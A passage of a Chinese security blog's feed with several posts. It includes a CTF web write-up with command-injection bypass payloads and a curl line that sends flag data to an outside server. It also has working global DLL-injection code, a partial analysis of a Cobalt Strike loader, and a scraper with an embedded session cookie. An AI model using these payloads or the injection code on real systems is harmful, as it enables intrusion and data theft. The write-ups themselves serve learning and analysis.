src="https://s3.ax1x.com/2021/01/04/sPYzS1.png" alt=""></p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>找不到切入点，跳过</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>RCE空格绕过</p><pre><code class="php">&lt;?phpif(isset($_REQUEST[ &#39;ip&#39; ])) {    $target = trim($_REQUEST[ &#39;ip&#39; ]);    $substitutions = array(        &#39;head&#39; =&gt; &#39;&#39;,        &#39;ls&#39; =&gt; &#39;&#39;,        &#39;cat&#39; =&gt; &#39;&#39;,        &#39;flag&#39; =&gt; &#39;&#39;,        &#39;&lt;&#39;  =&gt; &#39;&#39;,        &#39; &#39;  =&gt; &#39;&#39;,        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );        echo $target;    echo  &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}show_source(__FILE__);?&gt;</code></pre><p>变量拼接绕过</p><pre><code>http://10.20.105.228:8815/?ip=127.0.0.1;a=c;b=at;$a$b${IFS}*</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPtWnK.png" alt=""></p><h2 id="不难的"><a href="#不难的" class="headerlink" title="不难的"></a>不难的</h2><pre><code class="php">&lt;?php  include(&#39;hint.php&#39;);$data = $_GET[&quot;data&quot;];if(isset($data)&amp;&amp;(file_get_contents($data,&#39;r&#39;)===&quot;Welcome to jmpt CTF&quot;)){    echo $hint;}if(isset($_GET[&#39;file&#39;])){      $file = $_GET[&#39;file&#39;];      $content = $_POST[&#39;content&#39;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;a，各位师傅太能秀了！&#39;);?&gt;&quot;.$content);  }else{      highlight_file(__FILE__);  }?&gt;</code></pre><p>死亡exit绕过，p神有细说。<br>url双重编码绕过文件名过滤<br>rot13绕过即可（开启了短标签，rot13不会被解码写入，直接不编码即可）<br><img src="https://s3.ax1x.com/2021/01/04/sPN8HO.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/04/sPNdgI.png" alt=""></p><h2 id="qiongqiong"><a href="#qiongqiong" class="headerlink" title="qiongqiong"></a>qiongqiong</h2><pre><code class="php">&lt;?phpshow_source(__FILE__);if(isset($_GET[&#39;a&#39;])){    $feiyu=$_GET[&#39;a&#39;];    highlight_file(__FILE__);        if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$feiyu)){            die(&quot;No1 Die&quot;);        }        if(preg_match(&quot;/\~|\!|\@|#\|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$feiyu)){            die(&quot;No2 Die&quot;);        }        eval($feiyu);}?&gt;</code></pre><p>wfuzz得到没被过滤的几个字符<br><img src="https://s3.ax1x.com/2021/01/04/sPNvKx.png" alt=""></p><p>搜索得到该题为php临时文件shell<br><img src="https://s3.ax1x.com/2021/01/04/sPUCIe.png" alt=""></p><h2 id="满意的数字"><a href="#满意的数字" class="headerlink" title="满意的数字"></a>满意的数字</h2><p>访问index.php.txt得到code</p><pre><code class="php">&lt;?phpheader ( &#39;Content-Type: text/html; charset=utf-8&#39; ); // 网页编码error_reporting ( 0 );$flag = &quot;*******************&quot;;//echo $_POST[&#39;num&#39;];if (isset ( $_POST [&#39;num&#39;] )) {    if (@ereg ( &quot;^[1-9]+$&quot;, $_POST[&#39;num&#39;] ) === FALSE)        echo &#39;说好的数字呢？&#39;;    else if (strpos ( $_POST[&#39;num&#39;], &#39;#testaasafd&#39; ) !== FALSE)        die ( &#39;Flag: &#39; . $flag );    else        echo &#39;你的数字不太符合我的心意哦！&#39;;}?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;猜密码&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;text-align: center&quot;&gt;&lt;center&gt;&lt;img src=&quot;num.png&quot;/&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;num&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/center&gt;    &lt;!-- index.php.txt  --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>数组绕过解决<br><img src="https://s3.ax1x.com/2021/01/04/sPU3zn.png" alt=""></p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><pre><code class="php">&lt;?phphighlight_file(&#39;source.txt&#39;);echo &quot;&lt;br&gt;&lt;br&gt;&quot;;$flag = &#39;xxxxxxxx&#39;;$msg_giveme = &#39;Give me the flag!&#39;;$msg_getout = &#39;No this. Get out!&#39;;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){    exit($msg_giveme);}if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){    exit($msg_getout);}foreach ($_POST as $key =&gt; $value) {    $$key = $value;}foreach ($_GET as $key =&gt; $value) {    $$key = $$value;}echo &#39;the flag is : &#39; . $flag;?&gt;</code></pre><p>变量覆盖，原本是要flag=flag才能得到真正的flag，但是被if过滤了，多个变量暂存即可绕过</p><pre><code>http://10.20.105.228:8809/?123=flag&amp;flag=123</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPUoQI.png" alt=""></p><h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($c = @$_GET[&#39;c&#39;]){    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $c)){        eval(substr($c,0,5));    }else{        die(&quot;5个字母够了呀!&quot;);    }}</code></pre><p>搜索得知``为shell_exec缩写<br>此时将如上payload传到eval将变成如下<br><code>eval(</code>$c<code>;&lt;command&gt;)</code></p><p>看了一下wp，什么bp自带的客户端的dnslog数据外带，尝试用ceye.io数据外带。不是请求不到就是数据返回不全<br>最后想到的解决方法是，在服务器上<br><code>python3 -m http.server 4444</code></p><p>然后payload为<br><code>http://81.70.105.149:8006/?c=\</code>$c`;curl%20http://<ip>:4444/<code>cat${IFS}flag_i5_fun.php|grep${IFS}flag|base64</code><br><img src="https://s3.ax1x.com/2021/01/04/sPaAkF.png" alt=""></ip></p>]]></content>
    
    
      
      
    <summary type="html">&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;id=</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://422926799.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>数据结构实现数组</title>
    <link href="http://422926799.github.io/posts/57421f1d.html"/>
    <id>http://422926799.github.io/posts/57421f1d.html</id>
    <published>2020-12-29T09:50:25.000Z</published>
    <updated>2020-12-29T09:58:22.688Z</updated>
    
    <content type="html"><![CDATA[<p>昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构<br>目前需要学习的数据结构有：</p><pre><code>* 抽象数据类型 ADT，面向对象编程* 数组和列表* 链表，高级链表。双链表，循环双端链表* 队列，双端队列，循环双端队列* 栈，栈溢出* 算法分析，时间复杂度 大O 表示法* 哈希表，散列冲突* 字典* 集合* 递归* 查找：线性查找和二分查找* 基本排序算法* 高级排序算法: 归并排序、堆排序、快排* 树，二叉树* 图，dfs 和 bfs* python 内置常用数据结构和算法的使用。list, dict, set, collections 模块，heapq 模块* 面试笔试常考算法</code></pre><h2 id="数据和列表的区别"><a href="#数据和列表的区别" class="headerlink" title="数据和列表的区别"></a>数据和列表的区别</h2><p>数组：<br>数组是一个容器，它可以容纳一定数量的项目，这些项目是相同的类型。 大部分数据结构都使用数组来实现它们的算法。 以下是理解数组(Array)概念的重要术语。<br>元素 - 存储在数组中的每个项目称为元素。索引 - 数组中元素的每个位置都有一个数字索引，用于标识元素。//原文出自【易百教程】，商业转载请联系作者获得授权，非商业请保留原文链接：<a href="https://www.yiibai.com/python/py_data_structure/python_arrays.html" target="_blank" rel="noopener">https://www.yiibai.com/python/py_data_structure/python_arrays.html</a></p><p>列表：<br>列表是Python中最通用的数据类型，可以写成方括号之间的逗号分隔值(项目)列表。 使用列表的重要事项是，列表中的项目不必是相同的类型。也就是说一个列表中的项目(元素)可以是数字，字符串，数组，字典等甚至是列表类型。</p><p>数组和列表的区别为：数组只能放一个类型的数据，列表能放不同类型的数据</p><h2 id="使用python实现数组"><a href="#使用python实现数组" class="headerlink" title="使用python实现数组"></a>使用python实现数组</h2><p>虽然自带的Array的模块能实现数组，但是还是跟着文章走了一手<br>参考链接:<a href="https://blog.csdn.net/Tonywu2018/article/details/88819424" target="_blank" rel="noopener">https://blog.csdn.net/Tonywu2018/article/details/88819424</a></p><pre><code class="python">class Array(object):    def __init__(self,capacity,fillvalue=None):        self.items=list()        for count in range(capacity):            self.items.append(fillvalue)    def editarray(self,index):        if index+1&gt;int(len(self.items)):            #当当前索引下位标识超过数组长度自动添加数组长度            temp=Array(index+1)            for p in range(0,len(self.items)):                temp.__setitem__(p,self.items[p])            self.items=temp            del temp            return True        else:            return False    def __len__(self):        #返回数组长度        return len(self.items)    def __str__(self):        #返回str类型的数组        return str(self.items)    def __iter__(self):        #返回遍历好的数组        return iter(self.items)    def __getitem__(self, index):        #通过索引获取数组中的值        return self.items[index]    def __setitem__(self, index, newItem):        #替换指定位置的值        self.editarray(index)        self.items[index]=newItem        return self.items    def __delitem__(self, key):        #删除数组指定下标        del self.items[key]        return self.items    def __add__(self, value):        #数据末尾添加        calc=0        for k in self.items:            if len(str(k))!=0:                calc+=1            else:                break        self.__setitem__(calc,value)if __name__ == &#39;__main__&#39;:    a=Array(6)    for i in range(7):        a[i]=i    a.__delitem__(-1)    for x in a.__iter__():        print(x,end=&#39;&#39;)    a.__setitem__(0,9)    print(a.__str__())    a.__add__(101)    print(a.__str__())</code></pre><p>最终结果<br><img src="https://s3.ax1x.com/2020/12/29/rbUH0K.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构&lt;br&gt;目前需要学习的数据结构有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 抽象数据类型 ADT，面向对象编程
* 数组和列表
* 链表，高级链表。双链表，循环双端链表
* 队列，双</summary>
      
    
    
    
    
    <category term="数据结构" scheme="http://422926799.github.io/tags/数据结构/"/>
    
  </entry>
  
  <entry>
    <title>全局注入研究</title>
    <link href="http://422926799.github.io/posts/8bc59822.html"/>
    <id>http://422926799.github.io/posts/8bc59822.html</id>
    <published>2020-12-27T06:33:16.000Z</published>
    <updated>2020-12-27T06:50:35.088Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天和朋友聊的时候聊到全局注入，今天打算复现一下</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接:<a href="https://www.cnblogs.com/DarkBright/p/10835761.html" target="_blank" rel="noopener">https://www.cnblogs.com/DarkBright/p/10835761.html</a></p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>GetMsgProc<br>GetMsgProc与SetWindowsHookEx函数一起使用的应用程序定义或库定义的回调函数。每当GetMessage或PeekMessage函数从应用程序消息队列中检索消息时，系统就会调用此函数。在将检索到的消息返回给调用者之前，系统会将消息传递给挂钩过程。<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644981(v=vs.85)</a></p><p>SetWindowsHookExA<br>将应用程序定义的挂钩过程安装到挂钩链中。您将安装一个挂钩过程来监视系统中的某些类型的事件。这些事件与特定线程或与调用线程在同一桌面上的所有线程相关联。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa</a></p><p>UnhookWindowsHookEx<br>删除通过SetWindowsHookEx函数安装在挂钩链中的挂钩过程。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex</a></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>整体思路：</p><pre><code>1. 声明钩子返回的函数即为GetMsgProc2. 设置钩子要钩住的的事件类型3. 定义要执行的函数4. DLLMain载入DLL的时候定义要执行的code5. 调用dll的LoadHook函数钩住6. 然后dll的HookLoad函数7. 由于载入DLL的时候会先执行DLLMain，所以当前进程会执行DLLMain然后在调用钩子钩住对应的类型，然后在注入dll8. 根据需求卸载钩子</code></pre><p>test.dll<br>导出的函数</p><pre><code>* LoadHook* UnloadHook</code></pre><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;HHOOK g_hook;HMODULE g_module;extern &quot;C&quot; {        __declspec(dllexport) BOOL LoadHook();}extern &quot;C&quot; {        __declspec(dllexport) VOID UnloadHook();}LRESULT CALLBACK GetMsgProc(        _In_ int    code,        _In_ WPARAM wParam,        _In_ LPARAM lParam) {        return CallNextHookEx(g_hook, code, wParam, lParam);}BOOL LoadHook(void) {        g_hook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_module, 0);        if (g_hook) {               MessageBoxA(NULL, &quot;Sucess&quot;, 0, MB_OK);               return TRUE;        }        else {               return FALSE;        }}VOID UnloadHook(void) {        if (g_hook) {               UnhookWindowsHookEx(g_hook);        }}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               g_module = hModule;               MessageBox(NULL, TEXT(&quot;加载DLL!&quot;), TEXT(&quot;提示&quot;), MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>inject.exe</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define DLL_NAME &quot;test.dll&quot;#define error(name){printf(&quot;Error:%s code:%d&quot;,name,GetLastError());}int main() {        do {               HMODULE hModule = LoadLibraryA(DLL_NAME);               if (hModule == NULL) {                       error(&quot;LoadLibraryA&quot;);                       break;               }               FARPROC pfnLoadHook = GetProcAddress(hModule,&quot;LoadHook&quot;);               FARPROC pfnUnLoadHook = GetProcAddress(hModule, &quot;UnloadHook&quot;);               if (pfnLoadHook == NULL || pfnUnLoadHook == NULL) {                       error(&quot;GetProcAddress&quot;);                       break;               }               if (pfnLoadHook()) {                       printf(&quot;global inject sucess!&quot;);               }else {                       printf(&quot;global inject failure&quot;);                       break;               }               printf(&quot;Enter UnloadHook&quot;);               getchar();               pfnUnLoadHook();        } while (FALSE);        getchar();        return 0;}</code></pre><p>在当前权限所允许的情况下，会多所有能访问的进程钩住注入dll<br><img src="https://s3.ax1x.com/2020/12/27/r56jvn.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/27/r5c32d.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天和朋友聊的时候聊到全局注入，今天打算复现一下&lt;/p&gt;
&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>cs 4.0马子分析模仿</title>
    <link href="http://422926799.github.io/posts/b4f959ad.html"/>
    <id>http://422926799.github.io/posts/b4f959ad.html</id>
    <published>2020-12-26T11:03:27.000Z</published>
    <updated>2020-12-26T11:55:29.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下<br>由于技术不行，复现的并不完整。纯属记录</p><p>原文链接：<a href="https://www.52pojie.cn/thread-1334525-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1334525-1-1.html</a></p><h2 id="测试描述"><a href="#测试描述" class="headerlink" title="测试描述"></a>测试描述</h2><p>cs version:4.1<br>分段式exe</p><h2 id="分析工具"><a href="#分析工具" class="headerlink" title="分析工具"></a>分析工具</h2><p>IDA 7.5<br>x64dbg</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>Exeinfo查看对应的信息<br><img src="https://s3.ax1x.com/2020/12/26/r4EwPx.png" alt=""></p><p>无ASLR拖动到IDA分析,可寻找到入口点<br>(主要流程是执行两个函数然后开始循环sleep，默认是等待1秒)<br><img src="https://s3.ax1x.com/2020/12/26/r4VVW6.png" alt=""></p><p>根据原文章主要点在sub_401795，而sub_402A60尝试着去分析。后面并无得出啥结论<br>sub_401795<br><img src="https://s3.ax1x.com/2020/12/26/r4V5kR.png" alt=""></p><p>主要过程</p><ul><li>获取时间戳除以0x26AA</li><li>拼接得到pipe（管道）</li><li>创建进程执行sub_401685函数</li><li>返回sub_401742函数执行结果</li></ul><p>sub_401685函数<br><img src="https://s3.ax1x.com/2020/12/26/r4VztI.png" alt=""></p><p>继续跟踪里面的sub_4015D0</p><ul><li>创建管道</li><li>链接对应的管道</li><li>向管道写入shellcode</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4ZyEd.png" alt=""></li></ul><p>sub_401742函数</p><ul><li>malloc分配对应的内存空间</li><li>延时0x400秒</li><li>执行sub_4016A2函数</li><li>循环结束后执行sub_40152E函数<br><img src="https://s3.ax1x.com/2020/12/26/r4Z4KS.png" alt=""></li></ul><p>sub_4016A2函数</p><ul><li>创建管道</li><li>读取管道里的内容</li><li>关闭管道<br><img src="https://s3.ax1x.com/2020/12/26/r4epVJ.png" alt=""></li></ul><p>sub_40152E函数</p><ul><li>申请0x3000大小的内存空间</li><li>执行sub_4014F3函数判断是采用GetModuleHandleA还是GetProcAddress函数</li><li>执行VirtualProtect函数修改内存属性</li><li>CreateThread执行shellcode<br>sub_4014F3函数<br><img src="https://s3.ax1x.com/2020/12/26/r4eoQK.png" alt=""></li></ul><p><img src="https://s3.ax1x.com/2020/12/26/r4eKIA.png" alt=""></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>x64dbg打开，用IDA查看入口点函数的地址。x64dbg跳转到对应的地址<br><img src="https://s3.ax1x.com/2020/12/26/r4mVWq.png" alt=""></p><p>对照IDA单步跟踪下去找到写入管道<br><img src="https://s3.ax1x.com/2020/12/26/r4m3k9.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mmlV.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/26/r4mMmF.png" alt=""></p><p>读取管道并申请内存最后执行shellcode</p><ul><li>加载wininet.dll</li><li>再调用函数InternetOpen函数创建一个HINTERNET根句柄<br><img src="https://s3.ax1x.com/2020/12/26/r4m8YR.png" alt=""></li></ul><p>创建请求句柄，并把数据发送到服务器<br>随后解除数据向cs server发送请求<br><img src="https://s3.ax1x.com/2020/12/26/r4mN6K.png" alt=""></p><p>申请0x400000大小的内存，然后跳转执行到所申请的内存<br><img src="https://s3.ax1x.com/2020/12/26/r4mWnS.png" alt=""></p><p>然后原文那里解密出一个DLL并反射注入，并没模仿成功= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在看文章的时候看到52pojie的一篇分析cs 4.0马子的文章。想跟着分析一下&lt;br&gt;由于技术不行，复现的并不完整。纯属记录&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>C#爬虫初探</title>
    <link href="http://422926799.github.io/posts/ec93c081.html"/>
    <id>http://422926799.github.io/posts/ec93c081.html</id>
    <published>2020-12-26T04:11:54.000Z</published>
    <updated>2020-12-26T04:56:10.893Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近想学一下C#的winform。然后打算造个轮子搞搞</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>C#发起Http请求用的是<code>using System.Net</code>,利用WebRequest<br>Example</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Net;using System.IO;namespace ConsoleApplication47{    class Program    {        static void Main(string[] args)        {            string url = &quot;http://www.baidu.com/&quot;;            HttpWebRequest data = (HttpWebRequest)WebRequest.Create(url); //创建请求的URL            data.UserAgent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;; //设置UA头            data.Method = &quot;GET&quot;; //设置请求的方式            HttpWebResponse response = (HttpWebResponse)data.GetResponse(); //获取响应            Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;); //实例化一个编码            StreamReader sr = new StreamReader(response.GetResponseStream(), enc); //读取响应流并编码为UTF-8            var html = sr.ReadToEnd(); //从编码后的响应流完整读取            Console.WriteLine(html);            Console.ReadLine();        }    }}</code></pre><p>参考链接：<br><a href="https://blog.csdn.net/ksr12333/article/details/48845417" target="_blank" rel="noopener">https://blog.csdn.net/ksr12333/article/details/48845417</a><br><a href="https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/" target="_blank" rel="noopener">https://crifan.github.io/crawl_your_data_spider_technology/website/how_write_spider/use_csharp/</a></p><p>结果如下<br><img src="https://s3.ax1x.com/2020/12/26/rhudAJ.png" alt=""></p><p>这里拿baidu查询一个IP的归属地作为本次的目的<br><img src="https://s3.ax1x.com/2020/12/26/rhur1x.png" alt=""></p><p>这里查询的IP其实是baidu调用<code>ip138.com</code>的接口查询，如果你直接去爬ip138速度快的话一会就封IP了。<br>但是通过baidu去查则不会，虽然用多线程去请求baidu。快一点会出现baidu安全，其实带个cookie就能绕了</p><p>UI如下<br><img src="https://s3.ax1x.com/2020/12/26/rhuz3q.png" alt=""></p><p>这里值得注意的东西</p><ul><li>多线程处理UI的时候如何解决非原线程访问UI</li><li>UI的内容如何及时输出</li></ul><p>所以具体代码如下</p><pre><code class="C#">using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Drawing;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Windows.Forms;using System.IO;using System.Net;using System.Text.RegularExpressions;using System.Threading;namespace WindowsFormsApplication5{    public partial class Form1 : Form    {   //     static ReaderWriterLockSlim LogWriteLock = new ReaderWriterLockSlim();        public Form1()        {           // Control.CheckForIllegalCrossThreadCalls=false;            InitializeComponent();        }        public void query(object tmp) {            string ip = tmp.ToString();            this.Invoke((EventHandler)delegate { this.label4.Text = &quot;IP正在查询:&quot; + ip; });            string url = &quot;http://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=&quot; + ip;            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);            req.Headers.Add(&quot;cookie&quot;, &quot;PSTM=1598200102; BAIDUID=73A08DA2B8A1C47748FE6E0263B2D7FC:FG=1; BIDUPSID=D1A9BC856D198D087B62FE6369A51D38; BD_UPN=12314753; sug=3; ORIGIN=2; bdime=0; sugstore=1; H_PS_PSSID=1453_33331_33306_31660_32973_33285_33287_33350_33313_33312_33311_33310_33309_33318_33308_33307_33239_33266_33389_33384; BDORZ=B490B5EBF6F3CD402E515D22BCDA1598; __yjs_duid=1_2bbdf988e437a50cf1e9527aeb11331f1608818232011; delPer=0; BD_CK_SAM=1; PSINO=6; COOKIE_SESSION=22_1_9_8_31_4_0_0_8_4_1_0_27_0_7_0_1608820717_1608280511_1608820710%7C9%23347061_47_1608280509%7C9; ZD_ENTRY=baidu; BD_HOME=1; BAIDUID_BFESS=F0D55FAB35899A68F91651F30B80AA72:FG=1; H_PS_645EC=7084MH7oreen2FkWL7qh5SKWiBZPRoo%2BRDJ4tyV3Dtv8JX%2BpHwi%2FAw83RfE; BA_HECTOR=8h000g848ka4akak7v1fu9k6f0q&quot;);            req.Method = &quot;GET&quot;;            try            {                HttpWebResponse response = (HttpWebResponse)req.GetResponse();                Encoding enc = Encoding.GetEncoding(&quot;utf-8&quot;);                StreamReader sr = new StreamReader(response.GetResponseStream(), enc);                string html = sr.ReadToEnd();                sr.Close();                Regex zz = new Regex(@&quot;IP地址:.*&quot;);                var ips = zz.Matches(html);                if (ips.Count &gt; 0)                {                    string data = ips[0].ToString().Replace(&quot;&amp;nbsp;&quot;, &quot;&quot;).Replace(&quot;&lt;/span&gt;&quot;, &quot;-&quot;);                    this.Invoke((EventHandler)delegate                    {                        result.Text += data.ToString() + &quot;\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }                else                {                    this.Invoke((EventHandler)delegate                    {                        result.Text += &quot;IP:&quot; + ip + &quot;查询失败\n&quot;;                        result.Refresh();                        result.SelectionStart = result.Text.Length;                        result.ScrollToCaret();                    });                }            }            catch {                this.Invoke((EventHandler)delegate                {                    result.Text += &quot;IP:&quot;+ip+&quot;请求失败\n&quot;;                    result.Refresh();                    result.SelectionStart = result.Text.Length;                    result.ScrollToCaret();                });            }        }        private void button2_Click(object sender, EventArgs e)        {            List&lt;string&gt; iplist = new List&lt;string&gt;();            string []data = richTextBox1.Text.Split(&#39;\n&#39;);            foreach (var ip in data)            {                Regex pd = new Regex(&quot;(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)&quot;);                if (pd.Match(ip).ToString() != &quot;&quot;)                {                    iplist.Add(ip);                }            }            label3.Text = &quot;合法IP数量:&quot; + iplist.Count;            label3.Refresh();            foreach (var ip2 in iplist) {                label4.Refresh();                Thread t=new Thread(new ParameterizedThreadStart(query));                t.Start(ip2);            }            label4.Text = &quot;查询完成&quot;;            label4.Refresh();        }        private void button1_Click(object sender, EventArgs e)        {            try            {                File.WriteAllText(&quot;save.txt&quot;, result.Text);                MessageBox.Show(&quot;保存文件成功&quot;);            }            catch {                MessageBox.Show(&quot;保存文件失败&quot;);            }        }    }}</code></pre><p>最后测试结果<br><img src="https://s3.ax1x.com/2020/12/26/rhKdr8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近想学一下C#的winform。然后打算造个轮子搞搞&lt;/p&gt;
&lt;h2 id=&quot;过程&quot;&gt;&lt;a href=&quot;#过程&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="Warring" scheme="http://422926799.github.io/tags/Warring/"/>
    
  </entry>
  
  <entry>
    <title>开启和关闭ASLR</title>
    <link href="http://422926799.github.io/posts/2a9e327.html"/>
    <id>http://422926799.github.io/posts/2a9e327.html</id>
    <published>2020-12-19T13:07:08.000Z</published>
    <updated>2020-12-19T13:43:45.485Z</updated>
    
